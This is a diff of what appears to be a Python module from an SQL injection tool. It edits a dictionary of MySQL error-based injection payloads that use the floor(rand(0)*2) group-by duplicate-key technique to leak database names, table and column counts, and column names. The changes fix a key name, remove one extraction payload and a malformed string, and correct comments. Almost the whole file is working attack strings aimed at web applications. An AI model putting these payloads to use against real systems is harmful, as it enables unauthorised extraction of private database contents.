@@ -71,7 +71,7 @@ class error_based():
     mysql = {
 #-----------------------------[DATABASES]---------------------------
 #Current database name
-    "curr_dame_name" : "(select 1 from(select count(*),concat((concat(${MS},(select database()),${MS})),floor(rand(0)*2))x"\
+    "curr_db_name" : "(select 1 from(select count(*),concat((concat(${MS},(select database()),${MS})),floor(rand(0)*2))x"\
     " from information_schema.tables group by x)a)", 
 #Count of databases
     "dbs_count" :  "(select 1 from(select count(*),concat((concat(${MS},(select count(*) from mysql.db),${MS})),floor(rand(0)*2))x"\
@@ -96,16 +96,11 @@ class error_based():
 #-----------------------------[COLUMNS]-------------------------------
 #Count of columns in current table
     "columns_count" : "(select 1 from(select count(*),concat((concat(${MS},(select count(*) from information_schema.columns where table_schema="\
-    "${current_db} and table_name=${current_table}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)"   
-    " where table_name=${current_table})", 
-#Getting columns, method - not in(array)
-    "get_column_name" : "(select 1 from(select count(*),concat((concat(${MS},IFNULL((select column_name from information_schema.columns where"\
-    " table_schema=${current_db} and column_name not in(''${current_column})),char(105,115,110,117,108,108)),${MS})),floor(rand(0)*2))x from"\
-    " information_schema.tables group by x)a)", 
-#Gettin golumns by ordinal_position
+    "${current_db} and table_name=${current_table}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
+#Getting columns - LIMIT method
     "get_column_name2" : "(select 1 from(select count(*),concat((concat(${MS},(select column_name from information_schema.columns where table_schema="\
     "${current_db} and table_name=${current_table} limit ${num},1),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
-#Gettin golumns by ordinal_position
+#Getting columns by ordinal_position
     "get_column_name3" : "(select 1 from(select count(*),concat((concat(${MS},(select column_name from information_schema.columns where table_schema="\
     "${current_db} and table_name=${current_table} and ordinal_position=${num}),${MS})),floor(rand(0)*2))x from information_schema.tables group by x)a)", 
 #---------------------------------[ETC]--------------------------------
